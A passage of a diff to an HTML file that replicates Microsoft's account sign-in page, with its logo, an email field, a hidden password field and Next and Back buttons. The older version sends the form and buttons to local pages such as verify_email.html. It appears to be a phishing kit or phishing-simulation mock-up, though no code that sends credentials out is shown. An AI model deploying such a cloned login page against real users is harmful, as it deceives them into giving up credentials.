Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.dropdown-toggle.membernamePrefillSelect:active{transform:none;border:1px solid #0078d7;border-top-width:0;border-left-width:0;border-right-width:0}.dropdown-toggle.membernamePrefillSelect:focus{transform:none;border:1px solid #0078d7;border-top-width:0;border-left-width:0;border-right-width:0;background-color:#eee!important}.dropdown-toggle.membernamePrefillSelect:hover{border:1px solid #0078d7;border-top-width:0;border-left-width:0;border-right-width:0;background-color:#eee!important}.dropdown-toggle.membernamePrefillSelect.has-error:hover{border-width:1px;border-color:#e81123}.pagination-view{position:relative;min-height:206px}.lightbox-cover{background-color:white;opacity:0;filter:alpha(opacity=0);z-index:-1;height:100%;width:100%;position:absolute;top:0;left:0;transition:all .5s ease-in;-o-transition:all .5s ease-in;-moz-transition:all .5s ease-in;-webkit-transition:all .5s ease-in}.provide-min-height{min-height:1px}@media (-ms-high-contrast:active){.button,input[type="button"],input[type="submit"]{-ms-high-contrast-adjust:none}.btn:hover,.button:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover,.btn.btn-google:hover{outline:1px solid windowText;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.btn:hover:focus,.button:hover:focus,button:hover:focus,input[type="button"]:hover:focus,input[type="submit"]:hover:focus,input[type="reset"]:hover:focus,.btn.btn-google:hover:focus{outline:1px solid windowText;border:1px solid windowText;background-color:highlight;color:highlightText;text-decoration:underline}.btn:focus,.button:focus,button:focus,input[type="button"]:focus,input[type="submit"]:focus,input[type="reset"]:focus,.btn.btn-google:focus{outline:1px solid windowText;border:1px solid windowText;background-color:window;color:windowText;text-decoration:underline}.button.primary,input[type="submit"].primary,.button.secondary,input[type="button"].secondary{outline:1px solid highlight;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.btn.btn-primary:hover,.button.btn-primary:hover,button.btn-primary:hover,input[type="button"].btn-primary:hover,input[type="submit"].btn-primary:hover,input[type="reset"].btn-primary:hover,.btn.btn-google.btn-primary:hover,.btn.primary:hover,.button.primary:hover,button.primary:hover,input[type="button"].primary:hover,input[type="submit"].primary:hover,input[type="reset"].primary:hover,.btn.btn-google.primary:hover,.btn.secondary:hover,.button.secondary:hover,button.secondary:hover,input[type="button"].secondary:hover,input[type="submit"].secondary:hover,input[type="reset"].secondary:hover,.btn.btn-google.secondary:hover{outline:1px solid highlight;border:1px solid window;background-color:window;color:highlight;text-decoration:none}.btn.btn-primary:hover:focus,.button.btn-primary:hover:focus,button.btn-primary:hover:focus,input[type="button"].btn-primary:hover:focus,input[type="submit"].btn-primary:hover:focus,input[type="reset"].btn-primary:hover:focus,.btn.btn-google.btn-primary:hover:focus,.btn.primary:hover:focus,.button.primary:hover:focus,button.primary:hover:focus,input[type="button"].primary:hover:focus,input[type="submit"].primary:hover:focus,input[type="reset"].primary:hover:focus,.btn.btn-google.primary:hover:focus,.btn.secondary:hover:focus,.button.secondary:hover:focus,button.secondary:hover:focus,input[type="button"].secondary:hover:focus,input[type="submit"].secondary:hover:focus,input[type="reset"].secondary:hover:focus,.btn.btn-google.secondary:hover:focus{outline:1px solid windowText;border:1px solid window;background-color:window;color:highlight;text-decoration:underline}.btn.btn-primary:focus,.button.btn-primary:focus,button.btn-primary:focus,input[type="button"].btn-primary:focus,input[type="submit"].btn-primary:focus,input[type="reset"].btn-primary:focus,.btn.btn-google.btn-primary:focus,.btn.primary:focus,.button.primary:focus,button.primary:focus,input[type="button"].primary:focus,input[type="submit"].primary:focus,input[type="reset"].primary:focus,.btn.btn-google.primary:focus,.btn.secondary:focus,.button.secondary:focus,button.secondary:focus,input[type="button"].secondary:focus,input[type="submit"].secondary:focus,input[type="reset"].secondary:focus,.btn.btn-google.secondary:focus{outline:1px solid windowText;border:1px solid window;background-color:highlight;color:highlightText;text-decoration:underline}.btn.btn-primary.high-contrast-overrides:focus,.button.btn-primary.high-contrast-overrides:focus,button.btn-primary.high-contrast-overrides:focus,input[type="button"].btn-primary.high-contrast-overrides:focus,input[type="submit"].btn-primary.high-contrast-overrides:focus,input[type="reset"].btn-primary.high-contrast-overrides:focus,.btn.btn-google.btn-primary.high-contrast-overrides:focus,.btn.primary.high-contrast-overrides:focus,.button.primary.high-contrast-overrides:focus,button.primary.high-contrast-overrides:focus,input[type="button"].primary.high-contrast-overrides:focus,input[type="submit"].primary.high-contrast-overrides:focus,input[type="reset"].primary.high-contrast-overrides:focus,.btn.btn-google.primary.high-contrast-overrides:focus,.btn.secondary.high-contrast-overrides:focus,.button.secondary.high-contrast-overrides:focus,button.secondary.high-contrast-overrides:focus,input[type="button"].secondary.high-contrast-overrides:focus,input[type="submit"].secondary.high-contrast-overrides:focus,input[type="reset"].secondary.high-contrast-overrides:focus,.btn.btn-google.secondary.high-contrast-overrides:focus{outline:1px solid windowText;border:1px solid window;background-color:window;color:highlight;text-decoration:underline}.backButton:hover{outline:none;border:1px solid highlight;background-color:window;color:windowText}.backButton:hover:focus{outline:none;border:1px solid highlight;background-color:window;color:windowText}.backButton:focus,.backButton:active{outline:none;border:1px dashed highlight;background-color:window;color:windowText}}.cc-banner .cc-link:hover,.cc-banner .cc-link:focus{text-decoration:underline}.cc-banner .cc-link:focus{outline:0;background:#dae6ef;background:content-box rgba(0,120,215,0.1)}.env-banner-link:hover,.env-banner-link:link,.env-banner-link:visited,.env-banner-link:visited:hover,.env-banner-link:link:hover,.env-banner-link:active,.env-banner-link:link:active,.env-banner-link:visited:active{color:#fff}.animate{animation-duration:.25s;-webkit-animation-duration:.25s;-moz-animation-duration:.25s;-ms-animation-duration:.25s;-o-animation-duration:.25s;animation-timing-function:cubic-bezier(.5,0,.5,1);-webkit-animation-timing-function:cubic-bezier(.5,0,.5,1);-moz-animation-timing-function:cubic-bezier(.5,0,.5,1);-ms-animation-timing-function:cubic-bezier(.5,0,.5,1);-o-animation-timing-function:cubic-bezier(.5,0,.5,1);animation-fill-mode:both;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;-ms-animation-fill-mode:both;-o-animation-fill-mode:both;transition-property:left;-webkit-transition-property:left;-moz-transition-property:left;-ms-transition-property:left;-o-transition-property:left}html[dir=ltr] .animate.slide-in-next{animation-name:show-from-right;-webkit-animation-name:show-from-right;-moz-animation-name:show-from-right;-ms-animation-name:show-from-right;-o-animation-name:show-from-right}@keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-webkit-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-webkit-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-moz-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-moz-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-ms-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-ms-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-o-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-o-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}</style>
+<meta name=referrer content=no-referrer><link rel="shortcut icon" href="assets/f00c2d8b7a773187b71c62108b1ecd18.ico"><link rel=canonical href="#"><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"></head>
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class=cb style=display:block>
+ 
+ 
 <div>
 <div data-bind="if: activeDialog"></div>
-<form action="verify_email.html" autocomplete="off" class="provide-min-height" data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" id="i0281" method="post" name="f1" novalidate="" spellcheck="false" target="_top">
-<div class="login-paginated-page" data-bind="component: { name: 'master-page',
+<form name=f1 id=i0281 novalidate spellcheck=false method=post target=_top autocomplete=off data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="#" class=provide-min-height>
+ 
+ <div class=login-paginated-page data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
         params: {
             serverData: svr,
@@ -23,20 +90,29 @@
             hideFromAria: ariaHidden },
         event: {
             footerAgreementClick: footer_agreementClick } }">
-<div class="provide-min-height" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" id="lightboxTemplateContainer">
-<div data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
+ 
+ 
+ <div id=lightboxTemplateContainer data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class=provide-min-height>
+<div id=lightboxBackgroundContainer data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
     component: { name: 'background-image-control',
         publicMethods: $page.backgroundControlMethods,
-        event: { load: $page.backgroundImageControl_onLoad } }" id="lightboxBackgroundContainer"><div class="background-image-holder" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" role="presentation">
-<div aria-label="Organization background image" class="background-image ext-background-image" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" id="backgroundImage" role="img" style="background-image:url(assets/img_145a07dc.svg)"></div>
+        event: { load: $page.backgroundImageControl_onLoad } }"><div class=background-image-holder role=presentation data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
+ 
+ 
+ <div id=backgroundImage role=img data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image:url(assets/4525952e43dbec1e382c8f49798b30fc.svg)"></div>
+ 
+ 
 </div></div>
-<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
-<div class="template-section main-section">
-<div class="display-table-cell--vertical-align-middle ext-middle" data-bind="externalCss: { 'display-table-cell--vertical-align-middle': true }">
-<div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">
-<div class="flex-column">
-<div class="win-scroll">
-<div class="sign-in-box ext-sign-in-box" data-bind="
+<div class=outer data-bind="css: { 'app': $page.backgroundLogoUrl }">
+ 
+ <div class="template-section main-section">
+ <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
+ <div class=full-height data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">
+<div class=flex-column>
+ 
+ 
+ <div class=win-scroll>
+ <div id=lightbox data-bind="
             animationEnd: $page.paginationControlHelper.animationEnd,
             externalCss: { 'sign-in-box': true },
             css: {
@@ -48,15 +124,27 @@
                 'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                 'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                 'lightbox-bottom-margin-debug': $page.showDebugDetails,
-                'has-header': $content.hasHeader }" id="lightbox">
-<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
-<div data-bind="component: { name: 'logo-control',
+                'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box has-popup">
+ 
+ 
+ <div class=lightbox-cover data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
+ 
+ 
+ <div data-bind="component: { name: 'logo-control',
             params: {
                 isChinaDc: svr.fIsChinaDc,
                 bannerLogoUrl: bannerLogoUrl() } }">
-<img alt="Microsoft" class="logo" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" role="img" src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='108'%20height='24'%20viewBox='0%200%20108%2024'%3e%3ctitle%3eassets%3c/title%3e%3cpath%20d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z'%20fill='%23737373'/%3e%3crect%20width='10.931'%20height='10.931'%20fill='%23f25022'/%3e%3crect%20x='12.069'%20width='10.931'%20height='10.931'%20fill='%237fba00'/%3e%3crect%20y='12.069'%20width='10.931'%20height='10.931'%20fill='%2300a4ef'/%3e%3crect%20x='12.069'%20y='12.069'%20width='10.931'%20height='10.931'%20fill='%23ffb900'/%3e%3c/svg%3e" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"/>
+ 
+ 
+<img class=logo role=img pngsrc=https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png svgsrc=https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src=assets/eb70be1a325572bfc0693762f752f51a.svg alt=Microsoft>
+ 
+ 
+ 
 </div>
-<div data-bind="component: { name: 'pagination-control',
+ 
+ 
+ 
+ <div role=main data-bind="component: { name: 'pagination-control',
             publicMethods: paginationControlMethods,
             params: {
                 enableCssAnimation: svr.fEnableCssAnimation,
@@ -72,17 +160,20 @@
                 loadView: view_onLoadView,
                 showView: view_onShow,
                 setLightBoxFadeIn: view_onSetLightBoxFadeIn,
-                animationStateChange: paginationControl_onAnimationStateChange } }" role="main">
+                animationStateChange: paginationControl_onAnimationStateChange } }">
 <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
-<div class="pagination-view" data-bind="css: {
+ 
+ <div class="pagination-view animate slide-in-next" data-bind="css: {
         'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
         'zero-opacity': hidePaginatedView.hideSubView(),
-        'animation-duration-dot25s---webkit-animation-duration-dot25s': animate(),
+        'animate': animate(),
         'slide-out-next': animate.isSlideOutNext(),
         'slide-in-next': animate.isSlideInNext(),
         'slide-out-back': animate.isSlideOutBack(),
         'slide-in-back': animate.isSlideInBack() }">
-<div data-bind="pageViewComponent: { name: 'login-paginated-username-view',
+ 
+ 
+ <div data-viewid=1 data-showfedcredbutton=true data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                 params: {
                     serverData: svr,
                     serverError: initialError,
@@ -113,21 +204,29 @@
                     unregisterDialog: $loginPage.view_onUnregisterDialog,
                     showDialog: $loginPage.view_onShowDialog,
                     updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
-                    agreementClick: $loginPage.footer_agreementClick } }" data-showfedcredbutton="true" data-viewid="1">
+                    agreementClick: $loginPage.footer_agreementClick } }">
 <div data-bind="component: { name: 'header-control',
     params: {
         serverData: svr,
         title: customTitle() || str['WF_STR_HeaderDefault_Title'],
         headerDescription: customDescription() } }"><div>
-<div class="row title ext-title" data-bind="externalCss: { 'title': true }" id="loginHeader">
-<div aria-level="1" data-bind="text: title" role="heading">Sign in</div>
-</div>
+ <div class="row title ext-title" id=loginHeader data-bind="externalCss: { 'title': true }">
+ <div role=heading aria-level=1 data-bind="text: title">Sign in</div>
+ 
+ </div>
+ 
 </div></div>
-<div class="row">
-<div aria-live="assertive" role="alert">
-</div>
-<div class="form-group col-md-24">
-<div class="" data-bind="component: { name: 'placeholder-textbox-field',
+<div class=row>
+ 
+ 
+ <div role=alert aria-live=assertive>
+ 
+ </div>
+ 
+ <div class="form-group col-md-24">
+ 
+ 
+ <div class=placeholderContainer data-bind="component: { name: 'placeholder-textbox-field',
             publicMethods: usernameTextbox.placeholderTextboxMethods,
             params: {
                 serverData: svr,
@@ -135,7 +234,8 @@
                 hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
             event: {
                 updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
-<input aria-describedby="winBodyHeader winBodySubHeader loginHeader usernameError" aria-label="Enter your email, phone, or Skype." aria-required="true" autocomplete="username webauthn" class="form-control ltr_override input ext-input text-box ext-text-box" data-bind="
+ 
+ <input type=email name=loginfmt id=i0116 maxlength=113 class="form-control ltr_override input ext-input text-box ext-text-box" aria-required=true data-report-event=Signin_Email_Phone_Skype data-report-trigger=click data-report-value=Email_Phone_Skype_Entry data-bind="
                     attr: { lang: svr.fApplyAsciiRegexOnInput ? null : 'en',
                     autocomplete: svr.fEnablePasskeyAutofillUI ? 'username webauthn' : 'username' },
                     externalCss: {
@@ -147,36 +247,51 @@
                         'winBodyHeader winBodySubHeader loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription usernameError' : ' usernameError'),
                     textInput: usernameTextbox.value,
                     hasFocusEx: usernameTextbox.focused,
-                    placeholder: $placeholderText" data-report-attached="1" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" id="i0116" maxlength="113" name="loginfmt" placeholder="Email, phone, or Skype" type="email" value=""/>
-<input aria-hidden="true" class="position-fixed--bottom-0--right-0--height-0--width-0--overfl" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" id="i0118" name="passwd" tabindex="-1" type="password"/>
+                    placeholder: $placeholderText" autocomplete="username webauthn" aria-label="Enter your email, phone, or Skype." aria-describedby="winBodyHeader winBodySubHeader loginHeader usernameError" placeholder="Email, phone, or Skype" data-report-attached=1 value>
+ <input name=passwd type=password id=i0118 data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class=moveOffScreen tabindex=-1 aria-hidden=true>
+ 
 </div>
+ 
+ </div>
 </div>
-</div>
-<div class="position-buttons password-reset-links-container ext-password-reset-links-container" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }">
-<div class="row">
-<div class="col-md-24">
-<div class="text-13">
-<div class="form-group" data-bind="
+<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
+ <div class=row>
+ <div class=col-md-24>
+ <div class=text-13>
+ 
+ 
+ 
+ <div class=form-group data-bind="
                     htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                     childBindings: {
                         'signup': {
                             href: svr.urlSignUp || '#',
                             ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
-                            click: signup_onClick } }">No account? <a aria-label="Create a Microsoft account" href="create_account.html" id="signup">Create one!</a></div>
-<div class="form-group">
-<a data-bind="
+                            click: signup_onClick } }">No account? <a href="#" id=signup aria-label="Create a Microsoft account">Create one!</a></div>
+ 
+ 
+ 
+ <div class=form-group>
+ <a id=cantAccessAccount name=cannotAccessAccount data-bind="
                         text: svr.fEnableLivePreview ? cantAccessYourAccountText : unsafe_cantAccessYourAccountText,
                         click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                         attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
-                        href: accessRecoveryLink || '#'" href="reset_password.html" id="cantAccessAccount" name="cannotAccessAccount">Can’t access your account?</a>
+                        href: accessRecoveryLink || '#'" href=#>Can’t access your account?</a>
+ </div>
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ </div>
+ </div>
+ </div>
 </div>
-</div>
-</div>
-</div>
-</div>
-<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
-<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
-<div data-bind="component: { name: 'footer-buttons-field',
+<div class=win-button-pin-bottom data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
+ <div class=row data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
+ <div data-bind="component: { name: 'footer-buttons-field',
             params: {
                 serverData: svr,
                 isPrimaryButtonEnabled: !isRequestPending(),
@@ -190,25 +305,29 @@
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin },
     externalCss: { 'button-field-container': true }">
-<div class="inline-block button-item ext-button-item" data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }">
-<input class="win-button button-secondary padding-4px-12px-4px-12px--position-relative--max-width-100p ext-button ext-secondary" data-bind="
+ 
+ <div data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+ <input type=button id=idBtn_Back class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
             attr: { 'id': secondaryButtonId || 'idBtn_Back' },
             externalCss: {
-                'padding-4px-12px-4px-12px--position-relative--max-width-100p': true,
+                'button': true,
                 'secondary': true },
             value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
             ariaDescribedBy: secondaryButtonDescribedBy,
             hasFocus: focusOnSecondaryButton,
             click: secondaryButton_onClick,
             clickBubble: !svr.fEnableLivePreview,
-            enable: isSecondaryButtonEnabled" id="idBtn_Back" onclick="location.href='index.html'" onclick="location.href='index.html'" style="background-color: #cccccc !important; color: black !important; border: none !important; font-weight: normal !important; padding: 6px 12px !important; margin-right: 8px !important; cursor: pointer;" type="button" value="Back"/>
-</div>
-<div class="inline-block button-item ext-button-item" data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }">
-<input class="win-button button_primary high-contrast-overrides padding-4px-12px-4px-12px--position-relative--max-width-100p ext-button ext-primary" data-bind="
+            enable: isSecondaryButtonEnabled" value=Back>
+ </div>
+ 
+ <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+ 
+ 
+ <input type=submit id=idSIButton9 class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event=Signin_Submit data-report-trigger=click data-report-value=Submit data-bind="
                 attr: primaryButtonAttributes,
                 css: { 'high-contrast-overrides': true },
                 externalCss: {
-                    'padding-4px-12px-4px-12px--position-relative--max-width-100p': true,
+                    'button': true,
                     'primary': true },
                 value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                 hasFocus: focusOnPrimaryButton,
@@ -216,30 +335,200 @@
                 clickBubble: !svr.fEnableLivePreview,
                 enable: isPrimaryButtonEnabled,
                 visible: isPrimaryButtonVisible,
-                preventTabbing: primaryButtonPreventTabbing" data-report-attached="1" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSIButton9" onclick="event.preventDefault();location.href='verify_email.html'" style="background-color: #0067b8 !important; color: white !important; border: none !important; font-weight: normal !important; padding: 6px 12px !important; cursor: pointer;" onclick="event.preventDefault();location.href='verify_email.html'" type="submit" value="Next"/>
-</div>
+                preventTabbing: primaryButtonPreventTabbing" value=Next data-report-attached=1>
+ 
+ 
+ </div>
 </div></div>
+ </div>
 </div>
 </div>
-</div>
-</div>
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
